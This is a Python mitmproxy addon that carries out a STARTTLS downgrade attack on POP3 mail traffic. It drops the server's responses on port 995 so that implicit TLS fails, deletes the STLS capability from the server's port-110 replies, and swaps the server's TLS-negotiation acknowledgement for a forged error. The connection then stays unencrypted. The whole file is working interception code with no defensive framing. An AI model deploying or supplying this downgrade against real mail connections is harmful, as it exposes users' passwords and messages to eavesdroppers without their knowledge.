from mitmproxy import ctx
from mitmproxy import tcp, http, tls
import mitmproxy
from collections import defaultdict
from mitmproxy import command, flow
from typing import Sequence
import base64
import re

class pop3_TCP:
    def __init__(self) -> None:
        self.view = ctx.master.addons.get("view")
    
    def tcp_message(self, flow:tcp.TCPFlow):
        msg = flow.messages[-1] # latest message
        host_name = flow.server_conn.peername # ip, port
        
        if not msg.from_client:
            server_msg = bytearray(msg.content)
            if flow.server_conn.peername[1] == 995: # force client not to use implicit TLS
                server_msg = b''
                msg.content = server_msg

            if b'+OK Begin TLS negotiation' in server_msg:
                ctx.log.warn('client sends starttls')
                server_msg[0:] = b'-ERR Command not permitted when TLS active\r\n' # fake client to pretend an exisiting security layet is active
                msg.content = server_msg
                ctx.log.info(msg.content)
            if b'STLS' in server_msg and flow.server_conn.peername[1] == 110:
                position = server_msg.find(b'STLS')
                ctx.log.warn(f"starttls in position {server_msg.find(b'STLS')}")
                # remove the starttls
                server_msg[position:position+4+2] = b''
                msg.content = server_msg
            

addons = [pop3_TCP()]